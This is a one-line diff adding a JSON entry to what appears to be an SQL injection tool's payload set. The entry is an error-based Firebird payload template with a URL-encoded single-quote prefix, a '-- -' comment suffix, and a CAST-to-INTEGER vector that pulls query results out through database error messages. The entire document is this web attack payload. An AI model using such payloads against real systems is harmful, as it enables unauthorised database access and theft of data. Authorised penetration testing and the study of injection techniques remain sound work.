@@ -1,0 +1,1 @@
+{"dbms": "firebird", "technique": "error", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND 1=CAST(({Q}) AS INTEGER)", "comment": "firebird error: url-enc single"}
